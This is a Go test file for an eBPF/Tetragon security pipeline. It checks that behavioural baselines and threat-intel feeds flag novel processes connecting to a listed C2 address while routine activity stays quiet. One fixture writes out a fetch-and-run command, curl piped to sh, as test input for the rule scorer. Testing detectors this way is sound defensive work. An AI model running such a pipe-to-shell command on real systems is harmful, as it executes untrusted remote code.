package eventpipe

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/cilium/tetragon/api/v1/tetragon"
	"google.golang.org/protobuf/types/known/wrapperspb"

	"github.com/jeffmk/ebpf-poc-engine/internal/baseline"
	"github.com/jeffmk/ebpf-poc-engine/internal/findings"
	"github.com/jeffmk/ebpf-poc-engine/internal/intel"
	"github.com/jeffmk/ebpf-poc-engine/internal/store"
)

// warmProfile returns a profile that has learned a boring host.
func warmProfile(t *testing.T) *baseline.Profile {
	t.Helper()
	p := baseline.New(baseline.Warmup{MinObservations: 100, MinAge: time.Minute})
	at := time.Now().Add(-48 * time.Hour)
	for i := 0; i < 300; i++ {
		at = at.Add(5 * time.Minute)
		p.Observe(baseline.Observation{Binary: "/bin/bash", ParentBinary: "/usr/sbin/sshd", UID: 1000, At: at})
		p.Observe(baseline.Observation{Binary: "/bin/ls", ParentBinary: "/bin/bash", UID: 1000, At: at})
	}
	if !p.Ready() {
		t.Fatal("fixture must be ready")
	}
	return p
}

func intelSet(t *testing.T, body string) *intel.Set {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "c2.high.txt"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	s := intel.NewSet()
	if err := s.LoadDir(dir); err != nil {
		t.Fatal(err)
	}
	return s
}

func execEvent(execID, binary, args, parentID, parentBinary string, pid, uid uint32) *tetragon.ProcessExec {
	ev := &tetragon.ProcessExec{Process: proc(execID, pid, uid, binary, args)}
	if parentID != "" {
		ev.Parent = &tetragon.Process{
			ExecId: parentID, Pid: wrapperspb.UInt32(pid - 1),
			Uid: wrapperspb.UInt32(uid), Binary: parentBinary,
		}
	}
	return ev
}

// The headline capability: an event that matches NO rule still raises an alert
// when the behaviour is novel and the destination is a known indicator. This is
// the gap the static scorer could not express.
func TestEnrichmentAlertsOnAChainNoRuleWouldHaveCaught(t *testing.T) {
	p, ch := newPipeline(t, false)
	p.Baseline = warmProfile(t)
	p.Intel = intelSet(t, "198.51.100.7\tcobalt-strike\n")
	p.Findings = findings.NewRing()

	// A binary the host has never run, launched by a parent that has never
	// launched it. No scorer rule matches "/usr/local/bin/report".
	p.HandleExec(execEvent("e1", "/usr/local/bin/report", "--daily",
		"p1", "/usr/sbin/nginx", 4242, 33))
	ruleOnly := p.Tree.ChainScore("e1")
	if ruleOnly == 0 {
		t.Fatal("behavioural novelty contributed nothing; the baseline is not wired in")
	}

	// Now that process connects out to a listed address.
	p.HandleKprobe(&tetragon.ProcessKprobe{
		Process:    proc("e1", 4242, 33, "/usr/local/bin/report", ""),
		PolicyName: "outbound-connections",
		Args: []*tetragon.KprobeArgument{{
			Arg: &tetragon.KprobeArgument_SockArg{SockArg: &tetragon.KprobeSock{
				Daddr: "198.51.100.7", Dport: 443,
			}},
		}},
	})

	var alert *store.Alert
	for _, m := range drain(ch) {
		if m.Type == "alert" {
			alert, _ = m.Payload.(*store.Alert)
		}
	}
	if alert == nil {
		t.Fatal("a novel binary connecting to a known C2 address raised no alert")
	}
	if alert.Severity != "critical" {
		t.Errorf("a confirmed C2 connection should reach critical, got %q (score %d)", alert.Severity, alert.Score)
	}
	// The description is what an analyst reads. Both halves of the evidence
	// must be in it, or the alert is a number with no justification.
	if !strings.Contains(alert.Description, "198.51.100.7") {
		t.Errorf("alert must name the indicator: %q", alert.Description)
	}
	if !strings.Contains(alert.Description, "cobalt-strike") {
		t.Errorf("alert must carry the indicator's category: %q", alert.Description)
	}
}

// The counterweight. Routine activity must stay quiet, or operators turn the
// feature off within a day.
func TestRoutineActivityGainsNothingFromEnrichment(t *testing.T) {
	p, _ := newPipeline(t, false)
	p.Baseline = warmProfile(t)
	p.Intel = intelSet(t, "198.51.100.7\n")

	p.HandleExec(execEvent("r1", "/bin/bash", "-i", "pp", "/usr/sbin/sshd", 500, 1000))
	// bash -c scores 1 from the rules; the baseline must add nothing to what
	// this host does all day.
	if got := p.Tree.ChainScore("r1"); got > 1 {
		t.Fatalf("the host's most routine lineage gained %d anomaly points", got)
	}
}

func TestBehaviouralPointsCannotReachCriticalAlone(t *testing.T) {
	p, _ := newPipeline(t, false)
	p.Baseline = warmProfile(t)
	p.Findings = findings.NewRing()

	// A long chain of entirely novel execs — what a package upgrade looks like.
	for i := 0; i < 40; i++ {
		id := "u" + string(rune('a'+i%26)) + string(rune('0'+i/26))
		p.HandleExec(execEvent(id, "/usr/lib/new/tool"+id, "", "root0", "/usr/bin/dpkg", uint32(9000+i), 0))
	}
	for i := 0; i < 40; i++ {
		id := "u" + string(rune('a'+i%26)) + string(rune('0'+i/26))
		if got := p.Tree.ChainScore(id); got >= 40 {
			t.Fatalf("novelty alone reached the critical band (%d) on %s — a package upgrade would contain dpkg", got, id)
		}
	}
}

func TestChainAnomalyBudgetIsEnforced(t *testing.T) {
	p, _ := newPipeline(t, false)
	p.Baseline = warmProfile(t)

	// Every exec hangs off one root, so they share a budget.
	p.HandleExec(execEvent("root", "/usr/bin/dpkg", "", "", "", 100, 0))
	for i := 0; i < 30; i++ {
		p.HandleExec(execEvent("c"+string(rune('a'+i)), "/tmp/novel"+string(rune('a'+i)), "",
			"root", "/usr/bin/dpkg", uint32(200+i), 0))
	}
	total := 0
	for i := 0; i < 30; i++ {
		if n, ok := p.Tree.Get("c" + string(rune('a'+i))); ok {
			total += n.Score
		}
	}
	if r, ok := p.Tree.Get("root"); ok {
		total += r.Score
	}
	if total > chainAnomalyBudget {
		t.Fatalf("chain accumulated %d behavioural points, above the %d budget", total, chainAnomalyBudget)
	}
}

// An unready baseline must contribute nothing at all — a fresh host must not
// alert on everything it does on day one.
func TestUnreadyBaselineContributesNothing(t *testing.T) {
	p, ch := newPipeline(t, false)
	p.Baseline = baseline.New(baseline.DefaultWarmup) // empty, not ready
	p.Findings = findings.NewRing()

	p.HandleExec(execEvent("f1", "/usr/local/bin/anything", "", "p", "/usr/sbin/nginx", 7000, 0))
	if got := p.Tree.ChainScore("f1"); got != 0 {
		t.Fatalf("an unready baseline scored %d; a fresh host would alert on everything", got)
	}
	for _, m := range drain(ch) {
		if m.Type == "alert" {
			t.Fatal("an unready baseline raised an alert")
		}
	}
	if got := len(p.Findings.Recent("anomaly", 10)); got != 0 {
		t.Fatalf("an unready baseline recorded %d findings", got)
	}
}

func TestNilEnrichmentLeavesThePipelineUnchanged(t *testing.T) {
	// Every enrichment field is independently optional. A deployment that
	// configures neither must behave exactly as it did before this existed.
	p, ch := newPipeline(t, false)
	p.HandleExec(execEvent("n1", "/usr/bin/curl", "-fsSL https://x/y | sh", "", "", 10, 0))
	if p.Tree.ChainScore("n1") != 25 {
		t.Fatalf("rule scoring changed when enrichment is absent: %d", p.Tree.ChainScore("n1"))
	}
	if len(drain(ch)) == 0 {
		t.Fatal("pipeline stopped broadcasting")
	}
}

func TestPrivateAddressesInTelemetryNeverMatch(t *testing.T) {
	// The estate's own control plane is 172.31.45.193. If a feed listing it
	// could match, every agent's uplink would read as a C2 channel.
	p, _ := newPipeline(t, false)
	p.Intel = intelSet(t, "172.31.45.193\tc2\n")
	p.Findings = findings.NewRing()

	p.HandleKprobe(&tetragon.ProcessKprobe{
		Process:    proc("k1", 1, 0, "/opt/ebpf-soc/agent", ""),
		PolicyName: "outbound-connections",
		Args: []*tetragon.KprobeArgument{{
			Arg: &tetragon.KprobeArgument_SockArg{SockArg: &tetragon.KprobeSock{
				Daddr: "172.31.45.193", Dport: 9443,
			}},
		}},
	})
	if got := len(p.Findings.Recent("intel", 10)); got != 0 {
		t.Fatalf("the agent's own uplink matched an indicator feed (%d findings)", got)
	}
}
